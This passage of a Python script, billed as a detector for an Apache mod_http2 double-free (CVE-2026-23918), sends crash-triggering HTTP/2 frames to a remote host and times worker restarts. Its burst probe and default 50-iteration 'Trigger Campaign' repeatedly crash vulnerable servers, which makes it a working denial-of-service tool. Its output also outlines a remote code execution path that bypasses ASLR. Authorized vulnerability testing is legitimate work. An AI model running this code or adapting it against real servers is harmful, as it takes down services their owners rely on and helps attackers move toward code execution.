        block   = _req_block(host, sid, scheme=_scheme)
        payload = build_trigger(sid, block, error_code)
        tconn.send(payload)             # single sendall — pipelined

        reader   = H2FrameReader(tconn)
        deadline = time.time() + 0.10
        while time.time() < deadline:
            fr = reader.read(timeout=deadline - time.time())
            if fr is None:
                break
            if fr["type"] == 0x7:
                _, ec, _ = reader.goaway_fields(fr)
                result["goaway_on_trigger"]  = True
                result["goaway_error_code"]  = ec
        result["trigger_conn_closed"] = not tconn.connected
    except OSError:
        result["trigger_conn_closed"] = True
    finally:
        tconn.close()

    # ── Signal A: established-connection PING (immediate, ~2 ms) ─────────
    time.sleep(0.04)   # let the crash propagate
    if monitor is not None:
        mon_rtt = monitor._ping_once()
        result["monitor_rtt_ms"] = mon_rtt
        if mon_rtt is None:
            # This connection's worker is gone — definite crash
            result["crashed"] = True

    # ── Signal B: fresh-connection min RTT (definitive) ───────────────────
    # Wait a bit more if we already know it crashed (let MPM restart)
    extra_wait = 0.3 if result["crashed"] else 0.04
    time.sleep(extra_wait)
    ping_ok, connect_ms = health_check(host, port, tls, timeout=2.5)
    result["ping_ok"]    = ping_ok
    result["connect_ms"] = connect_ms

    if not result["crashed"]:
        result["crashed"] = _is_crash(ping_ok, connect_ms,
                                      baseline=baseline,
                                      baseline_ms=baseline_ms)

    # ── Confirmation step (eliminate single-event false positives) ─────────
    if result["crashed"] and baseline is not None:
        result["confirmed"] = confirm_crash(host, port, tls, baseline, n=2)
        if not result["confirmed"]:
            # Only one hit — could be a transient hiccup
            # Downgrade to "suspected" by clearing the crash flag
            # unless the monitor connection also died (hard evidence)
            if result["monitor_rtt_ms"] is not None:
                result["crashed"] = False
                logger.debug("probe_one: unconfirmed crash — single fresh-conn hit, "
                             "monitor alive; treating as jitter")

    return result

# ─────────────────────────────────────────────────────────────────────────────
# Burst probe — two-signal, confirmed, with control probes
# ─────────────────────────────────────────────────────────────────────────────
def probe_burst(host: str, port: int, tls: bool, n: int,
                baseline: Optional["BaselineStats"] = None,
                baseline_ms: float = 0.0) -> Dict:
    """
    Fire n triggers (cycling error codes) with precise health measurement.

    Improvements over simple burst:
    • PrecisionMonitor: low-latency PING on persistent connection detects
      crashes on THIS worker in ~2 ms vs ~300 ms for a fresh connection.
    • Control probes: every 3rd trigger fires a BENIGN request (HEADERS +
      END_STREAM, no RST) to verify baseline is stable; if benign requests
      are also slow → server load, not crashes.
    • Confirmation: suspected crashes require a majority of 2 follow-up
      probes to count (see probe_one).
    • Adaptive baseline: all crash decisions use BaselineStats.is_crash()
      which adapts to the actual server/network profile.
    """
    crash_count        = 0
    confirmed_count    = 0
    goaway_int_count   = 0
    connect_ms_list:   List[float] = []
    control_slow_count = 0

    # Start the precision monitor
    mon = PrecisionMonitor(host, port, tls)
    mon_ok = mon.start()
    if not mon_ok:
        logger.debug("PrecisionMonitor failed to connect — using fresh-only mode")

    bms = baseline.mean if baseline else baseline_ms

    for i in range(n):
        ec  = TRIGGER_ERROR_CODES[i % len(TRIGGER_ERROR_CODES)]
        sid = 1 + i * 4   # stride of 4 so sid never collides

        # ── Control probe every 3rd iteration ─────────────────────────────
        if i > 0 and i % 3 == 0 and baseline:
            ctrl_ok, ctrl_ms = probe_control(host, port, tls, baseline)
            if not ctrl_ok:
                control_slow_count += 1
                logger.debug(f"Control probe slow: {ctrl_ms:.0f}ms "
                             f"(threshold={baseline.threshold:.0f}ms)")

        # ── Trigger ────────────────────────────────────────────────────────
        r = probe_one(host, port, tls, ec, sid,
                      baseline=baseline,
                      baseline_ms=baseline_ms,
                      monitor=mon if mon_ok else None)

        if r["crashed"]:
            crash_count += 1
            if r.get("confirmed"):
                confirmed_count += 1
        if r.get("goaway_error_code") == 0x2:
            goaway_int_count += 1
        if r["connect_ms"] is not None:
            connect_ms_list.append(r["connect_ms"])

        # Allow MPM to finish restarting before next trigger
        sleep_s = 0.5 if r["crashed"] else 0.12
        time.sleep(sleep_s)

    mon.stop()

    avg_ms  = (_stats.mean(connect_ms_list) if connect_ms_list else 0.0)
    max_ms  = max(connect_ms_list, default=0.0)
    rate    = crash_count / n

    # crash_cycle: majority of triggers cause confirmed crashes
    crash_cycle = (rate > 0.4 and confirmed_count >= 2
                   and (baseline.is_crash(max_ms) if baseline
                        else max_ms >= bms * CRASH_MULTIPLIER))

    return {
        "n":                     n,
        "crash_count":           crash_count,
        "confirmed_count":       confirmed_count,
        "crash_rate":            round(rate, 3),
        "avg_connect_ms":        round(avg_ms, 1),
        "max_connect_ms":        round(max_ms, 1),
        "goaway_internal_count": goaway_int_count,
        "control_slow_count":    control_slow_count,
        "crash_cycle":           crash_cycle,
        "baseline_threshold_ms": round(baseline.threshold, 1) if baseline else None,
    }

# ─────────────────────────────────────────────────────────────────────────────
# Verdict
# ─────────────────────────────────────────────────────────────────────────────
def _behavioral_verdict(b: Dict, baseline: Optional['BaselineStats'] = None,
                        baseline_ms: float = 0.0) -> Tuple[str, str, List[str]]:
    """
    Map burst results to (verdict, confidence, [signals]).

    Crash indicator is RATIO-based:
      connect_ms / baseline_ms >= CRASH_MULTIPLIER (default 1.8x)

    This handles Docker/ASAN setups where baseline is 300+ ms.
    An absolute 150 ms threshold would always fire on such systems.

    False-positive guard:
      If rate > 0 but ratio < CRASH_MULTIPLIER: server closed cleanly (normal),
      NOT a crash.  e.g. patched server baseline=320ms, max=323ms → 1.01x < 1.8x.

    Vulnerable pattern  (from lab data):
      baseline=324ms, max=769ms → 2.37x ≥ 1.8x → MPM restart confirmed.
    """
    signals         = []
    rate            = b["crash_rate"]
    inst_rate       = b.get("instability_rate", rate)
    ping_unstable_n = b.get("ping_unstable_count", 0)
    max_ms          = b["max_connect_ms"]
    avg_ms          = b["avg_connect_ms"]
    cycle           = b["crash_cycle"]
    gae             = b["goaway_internal_count"]
    _bms            = baseline.mean if baseline else baseline_ms
    ratio           = max_ms / _bms if _bms > 0 else 0.0

    # ── False-positive guard ─────────────────────────────────────────────
    # Guard fires ONLY when ALL three conditions hold:
    #   1. connect_ms timing is within baseline (ratio < multiplier AND delta < min_delta)
    #   2. ping_unstable is low (< 30%) — no evidence of fast-restart crash
    #   3. control probes are mostly OK — not a loaded server masking crashes
    # If ping_unstable is high even with normal timing → fast restart happened
    # (server crashed and recovered before we measured it) — real vulnerability.
    delta          = max_ms - _bms
    timing_normal  = (_bms > 0 and
                      (ratio < CRASH_MULTIPLIER or delta < CRASH_MIN_DELTA_MS))
    pings_stable   = ping_unstable_n < b["n"] * 0.3   # < 30% ping failures
    ctrl_slow_fp   = b.get("control_slow_count", 0)
    ctrl_n_fp      = max(1, b["n"] // 3)
    ctrl_ok_fp     = ctrl_slow_fp / ctrl_n_fp < 0.7

    if timing_normal and pings_stable and ctrl_ok_fp and inst_rate < 0.3:
        bsummary = baseline.summary() if baseline else f'mean={_bms:.0f}ms'
        signals.append(
            f"Timing normal: max {max_ms:.0f} ms (ratio={ratio:.2f}x, "
            f"delta={delta:.0f} ms) and ping_unstable={ping_unstable_n}/{b['n']} "
            f"— trigger conn closed cleanly, no restart detected. "
            f"Baseline: {bsummary}"
        )
        return "LIKELY_PATCHED", "medium", signals

    # Fast-restart pattern: timing normal but pings unstable
    if timing_normal and not pings_stable and ctrl_ok_fp:
        signals.append(
            f"Fast-restart crash detected: timing normal (max={max_ms:.0f} ms, "
            f"ratio={ratio:.2f}x) but ping_unstable={ping_unstable_n}/{b['n']} "
            f"({ping_unstable_n/b['n']:.0%}) — server crashed and restarted "
            f"before measurement window. instability={inst_rate:.0%}."
        )
        # fall through to final verdict

    # ── Crash signals ─────────────────────────────────────────────────────
    if cycle:
        signals.append(
            f"Crash cycle: {b['crash_count']}/{b['n']} triggers caused MPM restart "
            f"({b.get('confirmed_count',0)} confirmed by follow-up probes). "
            f"Max reconnect {max_ms:.0f} ms = {ratio:.1f}x baseline "
            f"({baseline_ms:.0f} ms). "
            f"ASAN abort on double apr_pool_destroy confirmed."
        )
    elif rate > 0 and baseline_ms > 0 and ratio >= CRASH_MULTIPLIER:
        signals.append(
            f"Worker crash(es): {b['crash_count']}/{b['n']} triggers. "
            f"Max reconnect {max_ms:.0f} ms = {ratio:.1f}x baseline "
            f"({baseline_ms:.0f} ms) — MPM restart delay signature. "
            f"Not every trigger hits the unregistered-stream window "
            f"(timing-dependent, deterministic once aligned)."
        )
    elif rate > 0 and baseline_ms == 0:
        signals.append(
            f"Worker crash(es): {b['crash_count']}/{b['n']} triggers. "
            f"Max reconnect {max_ms:.0f} ms (no baseline — absolute threshold used)."
        )
    if gae:
        signals.append(
            f"Server sent GOAWAY INTERNAL_ERROR (0x2) {gae} time(s) — "
            f"APR heap corruption detected before abort."
        )

    # ── Control probe cross-check ─────────────────────────────────────────
    ctrl_slow = b.get("control_slow_count", 0)
    ctrl_n    = max(1, b["n"] // 3)
    ctrl_rate = ctrl_slow / ctrl_n
    if ctrl_rate > 0.7 and inst_rate > 0:
        signals.append(
            f"WARNING: {ctrl_slow}/{ctrl_n} benign control probes also slow "
            f"— server under load, not necessarily crashing. "
            f"Retry when load is lower."
        )
        if inst_rate < 0.7:
            return "UNKNOWN", "low", signals

    # ── High-jitter guard ─────────────────────────────────────────────────
    bs_obj = baseline
    if bs_obj is not None and bs_obj.is_high_jitter and b.get("confirmed_count",0) == 0:
        if inst_rate > 0:
            signals.append(
                f"High-jitter network (σ={bs_obj.stddev:.0f} ms) — "
                f"instability unconfirmed; verdict unreliable."
            )
            return "UNKNOWN", "low", signals

    # ── Stable signals ────────────────────────────────────────────────────
    if inst_rate == 0.0 and not gae:
        net = f" ({bs_obj.quality} network)" if bs_obj else ""
        signals.append(
            f"Zero instability across {b['n']} triggers{net} "
            f"(avg {avg_ms:.0f} ms, ratio {ratio:.2f}x). "
            f"add_for_purge() dedup guard appears active."
        )

    # ── Final verdict ─────────────────────────────────────────────────────
    confirmed_n = b.get("confirmed_count", 0)
    hj          = bs_obj.is_high_jitter if bs_obj else False

    # High confidence: crash cycle OR majority unstable + confirmed
    if cycle or (inst_rate > 0.5 and (confirmed_n >= 2 or not hj)):
        return "VULNERABLE", "high", signals
    # Medium: meaningful instability on low-jitter, or any GOAWAY IE
    if (inst_rate > 0.3 and (confirmed_n >= 1 or not hj)) or gae:
        return "LIKELY_VULNERABLE", "medium", signals
    if inst_rate == 0.0 and not gae:
        return "LIKELY_PATCHED", "medium", signals
    return "UNKNOWN", "low", signals

# ─────────────────────────────────────────────────────────────────────────────
# RemoteVulnDetector
# ─────────────────────────────────────────────────────────────────────────────
_COLORS = {"VULNERABLE":"\033[91m","LIKELY_VULNERABLE":"\033[33m",
           "PATCHED":"\033[92m","LIKELY_PATCHED":"\033[92m","UNKNOWN":"\033[37m"}
_RESET = "\033[0m"

def _color(text: str, key: str) -> str:
    return f"{_COLORS.get(key,'')}{text}{_RESET}"


class RemoteVulnDetector:
    def __init__(self, host: str, port: int, tls: bool, burst_n: int = 10,
                 scheme: str = ""):
        self.host, self.port, self.tls = host, port, tls
        self.scheme  = scheme or ("https" if tls else "http")
        self.burst_n = burst_n

    def run(self) -> Dict:
        report: Dict = {
            "target":            f"{self.host}:{self.port}",
            "tls":               self.tls,
            "timestamp":         time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "verdict":           "UNKNOWN",
            "confidence":        "low",
            "httpd_version":     None,
            "mod_http2_version": None,
            "rce_platform":      None,
            "mpm_indicator":     None,
            "h2_negotiated":     False,
            "risk_level":        "UNKNOWN",
            "cve":               CVE_ID,
            "cvss":              CVSS_SCORE,
            "server_header":     None,
            "signals":           [],
            "crash_probe":       None,
            "baseline_ms":       None,
        }

        # ── A: HTTP/1.1 banner ────────────────────────────────────────────
        print("  [A] HTTP/1.1 banner ...", end="", flush=True)
        svr = probe_banner_h1(self.host, self.port, self.tls)
        if svr:
            report["server_header"] = svr
            ver = _parse_ver(svr)
            if ver:
                v_str = "%d.%d.%d" % ver
                report["mod_http2_version"] = v_str
                report["verdict"]    = _ver_verdict(ver)
                report["confidence"] = "high"
                report["signals"].append(f"Server: {svr!r}  →  mod_http2/{v_str}")
                print(f" mod_http2/{v_str}")
            else:
                print(f" {svr!r}  (no mod_http2 version)")
            # Apache httpd version
            hv = parse_httpd_version(svr)
            if hv:
                hv_str = "%d.%d.%d" % hv
                report["httpd_version"] = hv_str
                if hv < FIXED_HTTPD_VERSION:
                    report["signals"].append(
                        f"Apache httpd {hv_str} < {FIXED_HTTPD_STR} — "
                        f"vulnerable release (fix shipped in httpd 2.4.67)"
                    )
                    if report["confidence"] != "high":
                        report["verdict"]    = "VULNERABLE"
                        report["confidence"] = "high"
                else:
                    report["signals"].append(
                        f"Apache httpd {hv_str} >= {FIXED_HTTPD_STR} — patched release"
                    )
            # RCE platform detection
            plat = detect_rce_platform(svr)
            if plat:
                report["rce_platform"] = plat
                report["signals"].append(
                    f"Platform: {plat} — APR mmap allocator is default; "
                    f"RCE path viable (scoreboard at fixed addr bypasses ASLR)"
                )
        else:
            print(" no Server header (ServerTokens Prod / HTTP2-only vhost)")

        # ── B: HTTP/2 frame scan ──────────────────────────────────────────
        if report["confidence"] != "high":
            print("  [B] HTTP/2 frame scan ...", end="", flush=True)
            h2v = probe_banner_h2(self.host, self.port, self.tls)
            if h2v:
                report["mod_http2_version"] = h2v
                ver = tuple(int(x) for x in h2v.split("."))
                report["verdict"]    = _ver_verdict(ver)
                report["confidence"] = "high"
                report["signals"].append(f"HTTP/2 HEADERS scan: mod_http2/{h2v}")
                print(f" mod_http2/{h2v}")
            else:
                print(" not found (Huffman encoding / ServerTokens Prod)")

        # ── Baseline ──────────────────────────────────────────────────────
        print(f"  [base] Baseline ({N_PINGS_PER_CHECK} PINGs × 15 samples, adaptive threshold) ...",
              end="", flush=True)
        base_ok, base_stats = probe_baseline(self.host, self.port, self.tls, n=15)
        base_ms = base_stats.mean if base_stats else 0.0
        report["baseline_ms"] = base_ms
        if not base_ok or base_stats is None:
            print(" FAILED — server not responding; aborting crash probe")
            report["signals"].append(
                "Baseline PING failed — server may be down or not speaking h2."
            )
            return report
        print(f" {base_stats.summary()}")

        # ── C: Crash probe ────────────────────────────────────────────────
        _thresh = round(base_stats.threshold, 0)
        _sigma  = BaselineStats.N_SIGMA
        print(f"  [C] Crash probe ({self.burst_n} triggers, "
              f"threshold={_thresh:.0f}ms "
              f"[{CRASH_MULTIPLIER}x|{_sigma}σ|+{CRASH_MIN_DELTA_MS}ms]) ...",
              end="", flush=True)
        burst = probe_burst(self.host, self.port, self.tls, self.burst_n,
                            baseline=base_stats, baseline_ms=base_ms)
        report["crash_probe"] = burst
        _delta_ms = burst["max_connect_ms"] - base_ms
        print(f" crash={burst['crash_rate']:.0%}"
              f"  max={burst['max_connect_ms']:.0f}ms"
              f"  (+{_delta_ms:.0f}ms, thresh={_thresh:.0f}ms)"
              f"  cycle={'YES' if burst['crash_cycle'] else 'no'}")

        bverdict, bconf, sigs = _behavioral_verdict(burst,
                                                   baseline=base_stats,
                                                   baseline_ms=base_ms)
        report["signals"].extend(sigs)

        if report["confidence"] != "high":
            report["verdict"]    = bverdict
            report["confidence"] = bconf
        elif (bverdict in ("VULNERABLE", "LIKELY_VULNERABLE")
              and report["verdict"] == "PATCHED"):
            report["signals"].append(
                "WARNING: version says PATCHED but crash probe shows worker deaths. "
                "Confirm mod_http2.so was actually recompiled, not just version-string patched."
            )

        # ── Risk level (computed after verdict is finalised) ──────────────
        _v = report["verdict"]
        if _v in ("VULNERABLE", "LIKELY_VULNERABLE"):
            if report.get("rce_platform"):
                report["risk_level"] = "DoS+RCE"
                report["signals"].append(
                    f"Risk DoS+RCE (CVSS {CVSS_SCORE}): APR mmap on "
                    f"{report['rce_platform']} — freed VA reuse, "
                    f"scoreboard at fixed addr bypasses ASLR. "
                    f"Working x86-64 PoC exists (Dmitruk / Strzalkowski)."
                )
            else:
                report["risk_level"] = "DoS"
                report["signals"].append(
                    f"Risk DoS (CVSS {CVSS_SCORE}): 1 conn · 2 frames · no auth · "
                    f"repeatable. RCE path unconfirmed — requires APR mmap allocator "
                    f"(default on Debian/Ubuntu/official Docker image)."
                )
        elif _v in ("PATCHED", "LIKELY_PATCHED"):
            report["risk_level"] = "NONE"
        else:
            report["risk_level"] = "UNKNOWN"

        return report

    @staticmethod
    def print_banner(report: Dict):
        v, W = report["verdict"], 68
        def row(lbl, val):
            print(f"│  {lbl:<12}: {val:<{W-16}}│")
        print("┌" + "─"*W + "┐")
        print(f"│{'  CVE-2026-23918  CVSS 8.8  — mod_http2 HEADERS+RST double-free':<{W}}│")
        print(f"│{'  Discovered by: Bartlomiej Dmitruk (Striga.ai) / Stanislaw Strzalkowski (ISEC.pl)':<{W}}│")
        print(f"│{'  Checked by: Alex Hdz  alt3kx@protonmail.com  [educational research]':<{W}}│")
        print("├" + "─"*W + "┤")
        row("Target",    report["target"])
        row("mod_http2", report.get("mod_http2_version") or "unknown")
        row("Confidence",report["confidence"])
        pad = W - len(f"  {'Verdict':<12}: {v}")
        print(f"│  {'Verdict':<12}: {_color(v, v)}{' '*pad}│")
        sigs = report.get("signals", [])
        if sigs:
            print("├" + "─"*W + "┤")
            for sig in sigs:
                for chunk in [sig[i:i+W-2] for i in range(0, max(1,len(sig)), W-2)]:
                    print(f"│  {chunk:<{W-2}}│")
        cp = report.get("crash_probe")
        bms = report.get("baseline_ms")
        if cp:
            print("├" + "─"*W + "┤")
            _thr   = cp.get("baseline_threshold_ms") or CRASH_RECOVERY_MIN_MS
            _unst  = cp.get("ping_unstable_count", 0)
            _irate = cp.get("instability_rate", cp["crash_rate"])
            _ctrl  = cp.get("control_slow_count", 0)
            line   = (f"  crash={cp['crash_rate']:.0%} "
                      f"unstable={_unst}/{cp['n']} "
                      f"instability={_irate:.0%}  "
                      f"max={cp['max_connect_ms']:.0f}ms  "
                      f"thr={_thr:.0f}ms  "
                      f"ctrl_slow={_ctrl}")
            print(f"│{line:<{W}}│")
        print("└" + "─"*W + "┘")
        print()
        if v in ("VULNERABLE", "LIKELY_VULNERABLE"):
            rl = report.get("risk_level", "DoS")
            print(f"  ⚠  [{rl}]  CVSS {CVSS_SCORE}  —  {CVE_ID}")
            print(f"  ⚠  UPGRADE: Apache httpd {FIXED_HTTPD_STR} / mod_http2 {FIXED_VERSION_STR}")
            print( "  ⚠  DoS: 1 TCP conn · 2 frames · no auth · no URL · repeatable")
            if report.get("rce_platform"):
                plat = report["rce_platform"]
                print(f"  ⚠  RCE: APR mmap active ({plat}) — working x86-64 PoC confirmed")
                print( "        mmap reuse → fake h2_stream → system() via pool cleanup")
                print( "        scoreboard at fixed addr bypasses ASLR entirely")
            else:
                print( "  !  RCE: APR mmap platform not detected from headers")
                print( "         verify: dpkg -l libapr1  (mmap default on Debian/Ubuntu/Docker)")
            print()
            print( "     Workaround: Protocols http/1.1   # in httpd.conf / vhost")
            print( "     Note: MPM prefork is NOT affected by this CVE")
        elif v in ("PATCHED", "LIKELY_PATCHED"):
            print(f"  ✓  add_for_purge() guard active — httpd >= {FIXED_HTTPD_STR}")
            print( "     Trigger connections closing cleanly is expected behavior.")
        print()
        print("  References:")
        print("    https://www.cve.org/CVERecord?id=CVE-2026-23918")
        print("    https://httpd.apache.org/security/vulnerabilities_24.html")
        print("    https://bz.apache.org/bugzilla/show_bug.cgi?id=69899")
        print()
        print("  ⚖  LEGAL: For authorized testing and educational research ONLY.")
        print("     Unauthorized use is illegal. Obtain written permission first.")
        print()

# ─────────────────────────────────────────────────────────────────────────────
# Campaign  (scale testing)
# ─────────────────────────────────────────────────────────────────────────────
def run_campaign(host: str, port: int, tls: bool,
                 iterations: int = 50, output_dir: str = "race_results"):
    os.makedirs(output_dir, exist_ok=True)
    crashes, survived = 0, 0
    print(f"{'─'*70}")
    print(f"  Campaign: {iterations} × HEADERS+RST(non-zero) → {host}:{port}")
    print(f"{'─'*70}")

    base_ok, camp_stats = probe_baseline(host, port, tls, n=15)
    if not base_ok or camp_stats is None:
        print("  Baseline PING failed — server not responding.")
        return
    camp_base_ms = camp_stats.mean
    print(f"  Baseline: {camp_stats.summary()}")

    results = []
    for i in range(iterations):
        ec  = TRIGGER_ERROR_CODES[i % len(TRIGGER_ERROR_CODES)]
        sid = 1 + i * 2
        r   = probe_one(host, port, tls, ec, sid, camp_base_ms)

        if r["crashed"]:
            crashes += 1
            ratio_v = r["connect_ms"] / camp_base_ms if camp_base_ms else 0
            tag = f"CRASH  ec=0x{ec:x}  reconnect={r['connect_ms']:.0f}ms  ({ratio_v:.1f}x baseline)"
            time.sleep(0.4)
        else:
            survived += 1
            tag = (f"ok     ec=0x{ec:x}  reconnect={r['connect_ms']:.0f}ms"
                   + ("  [conn-closed]" if r["trigger_conn_closed"] else ""))

        print(f"  [{i:4d}] sid={sid:5d}  {tag}")
        results.append({"i": i, "sid": sid, "ec": ec,
                        "crashed": r["crashed"],
                        "connect_ms": r["connect_ms"],
                        "trigger_conn_closed": r["trigger_conn_closed"]})

    rate = crashes / iterations if iterations else 0
    print(f"\n  📊 {crashes}/{iterations} confirmed crashes  "
          f"({rate:.0%})  |  {survived} survived")

    if crashes:
        print("     Crash = PING failed on fresh connection AND reconnect "
              f"> {CRASH_RECOVERY_MIN_MS} ms → double apr_pool_destroy confirmed")
        sp = os.path.join(output_dir, "campaign_summary.json")
        with open(sp, "w") as fh:
            json.dump({"iterations": iterations, "crashes": crashes,
                       "crash_rate": rate, "detail": results}, fh, indent=2)
        print(f"     Summary → {sp}")
    else:
        print("     No confirmed crashes. add_for_purge() guard appears active.")

# ─────────────────────────────────────────────────────────────────────────────
# Target resolution — accept any of:
#   https://host:port   http://host:port   host:port   host   IP   [IPv6]:port
# ─────────────────────────────────────────────────────────────────────────────
def parse_target(raw: str, default_port: int = 443,
                 explicit_tls: Optional[bool] = None,
                 ) -> Tuple[str, int, bool, str]:
    """
    Returns (host, port, tls, scheme).

    TLS / scheme priority:
      1. explicit_tls flag (--tls / --no-tls)
      2. Scheme prefix in raw string (https:// → True, http:// → False)
      3. Port heuristic (*443 → TLS, *80 → plain)
      4. Auto-detect: try TLS first, fall back to plain TCP
    """
    raw = raw.strip().rstrip("/")

    scheme_from_url: Optional[str] = None
    m = re.match(r'^(https?)://(.*)', raw, re.I)
    if m:
        scheme_from_url = m.group(1).lower()
        raw = m.group(2)

    # Parse host + port
    m_ipv6 = re.match(r'^\[([^\]]+)\](?::(\d+))?$', raw)
    if m_ipv6:
        host = m_ipv6.group(1)
        port = int(m_ipv6.group(2)) if m_ipv6.group(2) else default_port
    else:
        last_colon = raw.rfind(":")
        if last_colon != -1 and raw[last_colon+1:].isdigit():
            host = raw[:last_colon]
            port = int(raw[last_colon+1:])
        else:
            host = raw
            port = default_port

    # Determine TLS
    if explicit_tls is not None:
        tls    = explicit_tls
        scheme = "https" if tls else "http"
    elif scheme_from_url is not None:
        tls    = (scheme_from_url == "https")
        scheme = scheme_from_url
    elif str(port).endswith("443") or port == 443:
        tls, scheme = True, "https"
    elif port == 80 or str(port).endswith("80"):
        tls, scheme = False, "http"
    else:
        # Unknown port — probe both
        tls, scheme = _auto_detect_tls(host, port)

    return host, port, tls, scheme


def _auto_detect_tls(host: str, port: int) -> Tuple[bool, str]:
    """Try TLS first, then plain.  Called only for non-standard ports."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        s = socket.create_connection((host, port), timeout=3)
        s = ctx.wrap_socket(s, server_hostname=host)
        s.close()
        logger.debug(f"auto-detect TLS OK on {host}:{port}")
        return True, "https"
    except Exception as e:
        logger.debug(f"auto-detect TLS fail ({e}), trying plain")
    try:
        s = socket.create_connection((host, port), timeout=3)
        s.close()
        logger.debug(f"auto-detect plain OK on {host}:{port}")
        return False, "http"
    except Exception:
        pass
    logger.debug(f"auto-detect defaulting to TLS on {host}:{port}")
    return True, "https"


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────
def main():
    global CRASH_RECOVERY_MIN_MS, CRASH_MULTIPLIER, CRASH_MIN_DELTA_MS
    _threshold   = CRASH_RECOVERY_MIN_MS
    _multiplier  = CRASH_MULTIPLIER
    _min_delta   = CRASH_MIN_DELTA_MS
    _script      = os.path.basename(sys.argv[0])
    p = argparse.ArgumentParser(
        description="Apache mod_http2 CVE-2026-23918 - double-free detector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Crash detection logic\n"
            "---------------------\n"
            "  Trigger connection closing is NORMAL on both servers.\n"
            "  A crash requires: PING fails on a FRESH connection AND\n"
            f"  reconnect > {_threshold} ms (MPM restart delay).\n\n"
            "Examples\n"
            "--------\n"
            f"  python3 {_script} https://127.0.0.1:9443 --check-only\n"
            f"  python3 {_script} 127.0.0.1:7443 --check-only\n"
            f"  python3 {_script} 127.0.0.1:9443 --iterations 200\n"
            f"  python3 {_script} https://example.com --burst-n 20\n"
        ))
    # Positional target OR --host/--port
    p.add_argument("target", nargs="?", default=None,
                   metavar="TARGET",
                   help="https://host:port  http://host  host:port  host  IP")
    p.add_argument("--host",   default=None, help="Target host (alt to positional)")
    p.add_argument("--port",   type=int, default=None,
                   help="Target port (inferred from scheme/target if omitted)")
    p.add_argument("--tls",    action="store_true", default=None,
                   help="Force TLS/HTTPS (default: auto-detect)")
    p.add_argument("--no-tls", action="store_false", dest="tls",
                   help="Force plain TCP / h2c")
    p.add_argument("--iterations",  type=int, default=50)
    p.add_argument("--burst-n",     type=int, default=10,
                   help="Triggers in check phase (default 10)")
    p.add_argument("--timeout",     type=float, default=2.5,
                   help="Connection timeout s (default 2.5; use 5+ for internet)")
    p.add_argument("--crash-threshold", type=int, default=_threshold,
                   help=f"Fallback absolute ms when no baseline (default {_threshold})")
    p.add_argument("--crash-multiplier", type=float, default=_multiplier,
                   help=f"reconnect/baseline ratio to flag as crash (default {_multiplier}x)")
    p.add_argument("--crash-min-delta", type=int, default=_min_delta,
                   help=f"min ms above baseline (AND ratio) to flag crash (default {_min_delta}ms)")
    p.add_argument("--output",      default="race_results")
    p.add_argument("--check-only",  action="store_true")
    p.add_argument("--skip-check",  action="store_true")
    p.add_argument("--verbose",     action="store_true")
    args = p.parse_args()

    CRASH_RECOVERY_MIN_MS = args.crash_threshold
    CRASH_MULTIPLIER      = args.crash_multiplier
    CRASH_MIN_DELTA_MS    = args.crash_min_delta

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # ── Resolve target ────────────────────────────────────────────────────
    raw_target = args.target or args.host or "127.0.0.1"
    # If --port was given separately and raw_target has no port, append it
    _raw_noscheme = re.sub(r"^https?://", "", raw_target, flags=re.I)
    if args.port and not re.search(r":\d+$", _raw_noscheme):
        raw_target = f"{raw_target}:{args.port}"
    host, port, tls, scheme = parse_target(
        raw_target,
        default_port=args.port or 443,
        explicit_tls=args.tls,
    )

    _script = os.path.basename(sys.argv[0])
    print()
    print("╔══════════════════════════════════════════════════════════════════════════╗")
    print("║  CVE-2026-23918  CVSS 8.8  — Apache httpd mod_http2 double-free         ║")
    print("║  DoS: trivial (1 conn, 2 frames)  |  RCE: APR mmap (Debian/Docker)      ║")
    print("║  Fix: Apache httpd 2.4.67 / mod_http2 2.0.37  |  PR #69899              ║")
    print("╠══════════════════════════════════════════════════════════════════════════╣")
    print("║  CVE discovered by:                                                      ║")
    print("║    Bartlomiej Dmitruk  — Striga.ai                                       ║")
    print("║    Stanislaw Strzalkowski — ISEC.pl                                      ║")
    print("╠══════════════════════════════════════════════════════════════════════════╣")
    print("║  Detector script by:                                                     ║")
    print("║    Alex Hdz  (alt3kx@protonmail.com)                                     ║")
    print("║    For educational and authorized security research purposes only        ║")
    print("╠══════════════════════════════════════════════════════════════════════════╣")
    print("║  References:                                                             ║")
    print("║    https://www.cve.org/CVERecord?id=CVE-2026-23918                       ║")
    print("║    https://httpd.apache.org/security/vulnerabilities_24.html             ║")
    print("║    https://github.com/apache/httpd/blob/trunk/CHANGES                   ║")
    print("║    https://bz.apache.org/bugzilla/show_bug.cgi?id=69899                 ║")
    print("╠══════════════════════════════════════════════════════════════════════════╣")
    print("║  DISCLAIMER: For authorized testing and educational research ONLY.       ║")
    print("║  Unauthorized use against systems you do not own or have explicit        ║")
    print("║  written permission to test is ILLEGAL. The author assumes no liability  ║")
    print("║  for misuse. Always obtain proper authorization before testing.          ║")
    print("╚══════════════════════════════════════════════════════════════════════════╝")
    print(f"  Target  : {scheme}://{host}:{port}")
    print(f"  TLS     : {tls}  multiplier={CRASH_MULTIPLIER}x  "
          f"min_delta={CRASH_MIN_DELTA_MS}ms  threshold={CRASH_RECOVERY_MIN_MS}ms\n")

    if not args.skip_check:
        print("── Phase 1: Remote Vulnerability Assessment ─────────────────────────")
        det    = RemoteVulnDetector(host, port, tls, burst_n=args.burst_n,
                                    scheme=scheme)
        report = det.run()
        report["scheme"] = scheme
        print()
        RemoteVulnDetector.print_banner(report)
        os.makedirs(args.output, exist_ok=True)
        cp = os.path.join(args.output, "vuln_check.json")
        with open(cp, "w") as fh:
            json.dump(report, fh, indent=2)
        print(f"  Report → {cp}\n")
        if args.check_only:
            v = report["verdict"]
            sys.exit(0 if v in ("PATCHED", "LIKELY_PATCHED") else 1)

    if not args.check_only:
        print("── Phase 2: Trigger Campaign ────────────────────────────────────────")
        run_campaign(host, port, tls, args.iterations, args.output)

if __name__ == "__main__":
    main()
